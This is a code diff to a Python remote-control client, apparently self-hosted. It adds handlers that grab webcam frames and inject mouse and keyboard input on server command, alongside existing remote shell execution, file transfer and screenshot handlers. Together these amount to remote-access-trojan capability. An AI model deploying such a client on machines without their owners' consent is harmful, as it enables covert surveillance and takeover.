@@ -6,6 +6,8 @@
                  директория шлётся как <name>.zip)
   - post       — принять файл от сервера (payload = путь назначения на клиенте)
   - screenshot — снимок экрана(ов) PNG
+  - photo      — кадр с веб-камеры PNG
+  - input      — эмуляция мыши/клавиатуры через pyautogui (мини-DSL в payload)
 
 Конфиг лежит в client/config.json (см. config.example.json).
 Токен сохраняется в client/token.txt — повторная регистрация безопасна
@@ -353,11 +355,231 @@ def handle_screenshot(cmd: dict, client: Client) -> dict:
     }
 
 
+def handle_photo(cmd: dict, client: Client) -> dict:
+    """Снимок с веб-камеры (первый доступный индекс)."""
+    try:
+        import cv2
+    except ImportError:
+        return {"status": "error", "output": "opencv-python не установлен (pip install opencv-python)"}
+
+    index = 0
+    payload = (cmd.get("payload") or "").strip()
+    if payload:
+        try:
+            index = int(payload)
+        except ValueError:
+            return {"status": "error", "output": f"payload должен быть индексом камеры (int), а не {payload!r}"}
+
+    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW) if sys.platform == "win32" else cv2.VideoCapture(index)
+    if not cap.isOpened():
+        cap.release()
+        return {"status": "error", "output": f"камера {index} недоступна"}
+    try:
+        frame = None
+        for _ in range(5):  # прогрев — первые кадры часто чёрные
+            ok, frame = cap.read()
+            if not ok:
+                frame = None
+        if frame is None:
+            return {"status": "error", "output": "не удалось прочитать кадр"}
+        ok, buf = cv2.imencode(".png", frame)
+        if not ok:
+            return {"status": "error", "output": "не удалось закодировать PNG"}
+        png = buf.tobytes()
+        h, w = frame.shape[:2]
+    finally:
+        cap.release()
+
+    return {
+        "status": "done",
+        "output": f"photo {w}x{h} cam={index}",
+        "file_bytes": png,
+        "file_name": "photo.png",
+    }
+
+
+def handle_input(cmd: dict, client: Client) -> dict:
+    """Эмуляция мыши/клавиатуры через pyautogui.
+
+    payload — список действий, по одному на строку. Пустые строки и строки,
+    начинающиеся с '#', игнорируются. Поддерживаемые действия:
+
+      move    x y [duration]              — переместить курсор (абсолютно)
+      moverel dx dy [duration]            — переместить относительно
+      click   [x y] [button] [clicks]     — клик (button=left|right|middle)
+      doubleclick [x y]
+      rightclick  [x y]
+      mousedown   [x y] [button]
+      mouseup     [x y] [button]
+      drag    dx dy [duration] [button]   — drag относительно
+      dragto  x y  [duration] [button]
+      scroll  amount [x y]                — + вверх / - вниз
+      hscroll amount [x y]
+      press   key [count]                 — нажать клавишу N раз
+      keydown key
+      keyup   key
+      hotkey  k1 k2 ...                   — комбинация
+      type    <текст до конца строки>     — pyautogui.write (только ASCII)
+      write   <текст до конца строки>     — алиас type
+      sleep   секунды
+
+    Имена клавиш — как у pyautogui (enter, esc, f1, ctrl, shift, win, ...).
+    Кириллицу type не печатает (ограничение pyautogui.write); для не-ASCII
+    используйте hotkey + paste через буфер обмена на стороне отдельно.
+    Failsafe pyautogui включён: курсор в (0,0) прервёт команду.
+    """
+    payload = cmd.get("payload") or ""
+    if not payload.strip():
+        return {"status": "error", "output": "пустой payload для input"}
+
+    try:
+        import pyautogui
+    except ImportError:
+        return {"status": "error", "output": "pyautogui не установлен (pip install pyautogui)"}
+
+    log_lines: list[str] = []
+
+    def _num(s: str) -> float:
+        return float(s)
+
+    def _int(s: str) -> int:
+        return int(s)
+
+    actions = {
+        "move":        lambda a: pyautogui.moveTo(_num(a[0]), _num(a[1]), duration=_num(a[2]) if len(a) > 2 else 0),
+        "moveto":      lambda a: pyautogui.moveTo(_num(a[0]), _num(a[1]), duration=_num(a[2]) if len(a) > 2 else 0),
+        "moverel":     lambda a: pyautogui.moveRel(_num(a[0]), _num(a[1]), duration=_num(a[2]) if len(a) > 2 else 0),
+        "doubleclick": lambda a: pyautogui.doubleClick(*( (_num(a[0]), _num(a[1])) if len(a) >= 2 else () )),
+        "rightclick":  lambda a: pyautogui.rightClick(*( (_num(a[0]), _num(a[1])) if len(a) >= 2 else () )),
+        "scroll":      lambda a: pyautogui.scroll(_int(a[0]), *( (_num(a[1]), _num(a[2])) if len(a) >= 3 else () )),
+        "hscroll":     lambda a: pyautogui.hscroll(_int(a[0]), *( (_num(a[1]), _num(a[2])) if len(a) >= 3 else () )),
+        "keydown":     lambda a: pyautogui.keyDown(a[0]),
+        "keyup":       lambda a: pyautogui.keyUp(a[0]),
+        "hotkey":      lambda a: pyautogui.hotkey(*a),
+        "sleep":       lambda a: time.sleep(_num(a[0])),
+    }
+
+    def do_click(args: list[str], fn) -> None:
+        # [x y] [button] [clicks]
+        x = y = None
+        button = "left"
+        clicks = 1
+        rest = list(args)
+        if len(rest) >= 2:
+            try:
+                x, y = _num(rest[0]), _num(rest[1])
+                rest = rest[2:]
+            except ValueError:
+                pass
+        if rest and rest[0] in ("left", "right", "middle", "primary", "secondary"):
+            button = rest[0]
+            rest = rest[1:]
+        if rest:
+            clicks = _int(rest[0])
+        kwargs = {"button": button, "clicks": clicks}
+        if x is not None:
+            kwargs["x"], kwargs["y"] = x, y
+        fn(**kwargs)
+
+    def do_mousebtn(args: list[str], fn) -> None:
+        x = y = None
+        button = "left"
+        rest = list(args)
+        if len(rest) >= 2:
+            try:
+                x, y = _num(rest[0]), _num(rest[1])
+                rest = rest[2:]
+            except ValueError:
+                pass
+        if rest and rest[0] in ("left", "right", "middle"):
+            button = rest[0]
+        kwargs = {"button": button}
+        if x is not None:
+            kwargs["x"], kwargs["y"] = x, y
+        fn(**kwargs)
+
+    def do_drag(args: list[str], rel: bool) -> None:
+        # x y [duration] [button]
+        if len(args) < 2:
+            raise ValueError("drag требует x y")
+        x, y = _num(args[0]), _num(args[1])
+        duration = 0.0
+        button = "left"
+        rest = args[2:]
+        if rest:
+            try:
+                duration = _num(rest[0])
+                rest = rest[1:]
+            except ValueError:
+                pass
+        if rest and rest[0] in ("left", "right", "middle"):
+            button = rest[0]
+        if rel:
+            pyautogui.dragRel(x, y, duration=duration, button=button)
+        else:
+            pyautogui.dragTo(x, y, duration=duration, button=button)
+
+    def do_press(args: list[str]) -> None:
+        if not args:
+            raise ValueError("press требует имя клавиши")
+        key = args[0]
+        count = _int(args[1]) if len(args) > 1 else 1
+        pyautogui.press(key, presses=count)
+
+    for lineno, raw in enumerate(payload.splitlines(), 1):
+        line = raw.strip()
+        if not line or line.startswith("#"):
+            continue
+
+        # type/write — остаток строки как сырой текст
+        head, _, tail = line.partition(" ")
+        head = head.lower()
+        if head in ("type", "write"):
+            try:
+                pyautogui.write(tail)
+                log_lines.append(f"{lineno}: {head} ({len(tail)} chars) ok")
+            except Exception as e:
+                return {"status": "error", "output": "\n".join(log_lines + [f"{lineno}: {head}: {e}"])}
+            continue
+
+        parts = line.split()
+        verb = parts[0].lower()
+        args = parts[1:]
+        try:
+            if verb == "click":
+                do_click(args, pyautogui.click)
+            elif verb == "mousedown":
+                do_mousebtn(args, pyautogui.mouseDown)
+            elif verb == "mouseup":
+                do_mousebtn(args, pyautogui.mouseUp)
+            elif verb == "drag":
+                do_drag(args, rel=True)
+            elif verb == "dragto":
+                do_drag(args, rel=False)
+            elif verb == "press":
+                do_press(args)
+            elif verb in actions:
+                actions[verb](args)
+            else:
+                return {"status": "error", "output": "\n".join(log_lines + [f"{lineno}: неизвестное действие {verb!r}"])}
+            log_lines.append(f"{lineno}: {line} ok")
+        except pyautogui.FailSafeException:
+            return {"status": "error", "output": "\n".join(log_lines + [f"{lineno}: failsafe (курсор в углу) — прервано"])}
+        except Exception as e:
+            return {"status": "error", "output": "\n".join(log_lines + [f"{lineno}: {line}: {e}"])}
+
+    x, y = pyautogui.position()
+    log_lines.append(f"done, cursor=({x},{y})")
+    return {"status": "done", "output": "\n".join(log_lines)}
+
+
 HANDLERS = {
     "exec": handle_exec,
     "get": handle_get,
     "post": handle_post,
     "screenshot": handle_screenshot,
+    "photo": handle_photo,
+    "input": handle_input,
 }
 
 
